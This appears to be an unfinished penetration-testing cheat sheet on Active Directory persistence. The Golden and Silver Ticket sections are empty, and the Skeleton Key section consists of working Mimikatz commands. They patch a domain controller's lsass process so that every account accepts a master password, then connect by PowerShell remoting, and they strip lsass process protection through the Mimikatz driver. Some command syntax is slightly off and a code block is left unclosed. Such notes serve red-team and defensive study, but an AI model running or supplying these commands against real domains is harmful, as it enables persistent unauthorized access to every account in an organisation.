## Persistence on Active Directory 

### Golden Ticket



### Silver Ticket


### Skeleton Key
```powershell
# Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>

# Access with password `mimikatz`
C:> Enter-PSSession -Computername <host> -Credential <domain>\<username>
```
```powershell
# If lsass is running proected, need to use mimikatz driver
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect process:lsass.exe /remove
mimikatz # misc ::skeleton
mimikatz # !
### MORE





